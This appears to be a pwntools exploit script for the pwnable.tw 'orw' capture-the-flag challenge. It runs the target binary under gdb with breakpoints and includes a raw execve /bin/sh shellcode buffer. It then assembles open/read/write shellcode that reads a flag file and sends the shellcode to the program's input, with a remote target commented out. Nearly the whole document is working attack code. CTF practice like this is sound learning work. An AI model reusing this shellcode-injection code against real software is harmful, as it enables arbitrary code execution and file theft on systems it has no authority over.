#!python2

from pwn import *

context.clear()
context.terminal = [ "termite", "-e" ]

# context.update(arch='i386', endian='little', os='linux')
p = process("./challange/orw")
# p = remote('chall.pwnable.tw',10001)
elf = ELF("./challange/orw")
# gdb.attach(p)
gdb.attach(p, '''
        #break *0x08048582
        break *0x0804858a
        # If there is only one sw breakpoint it works because breakpoints are not updated
        break *0x804a060 
        c
        # This needs to bet set after the shelcode has been copied! Else gdb fails to restore the
        # copied instruction (gdb will restore 0x804a060 to 0)
        # break *0x804a060 
        x /5i 0x804a060
        x /5x 0x804a060
''')

# p = remote('chall.pwnable.tw', 10201)
buf = ""
buf += "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
buf += "\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
buf += "\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
buf += "\x89\xe1\xcd\x80"

# print(disasm(buf))
shellcode='''
push {};
sub dword ptr [esp],0x01010101;
push {};
push {};
push {};
mov ebx,esp;
xor ecx,ecx;
xor edx,edx;
xor eax,eax;
mov al,0x5;
int 0x80;
mov ebx,eax;
xor eax,eax;
mov al,0x3;
mov ecx,esp;
mov dl,0x30;
int 0x80;
mov al,0x4;
mov bl,1;
mov dl,0x30;
int 0x80;
'''.format(hex(u32('bh'+chr(1)+chr(1))),hex(u32('w/fl')),hex(u32('e/or')),hex(u32('/hom')))
# print(asm(shellcode))
f = open('exploit', 'wb')
f.write(asm(shellcode))
f.close()


p.recvuntil("Give my your shellcode:")
p.send(asm(shellcode))

p.interactive()

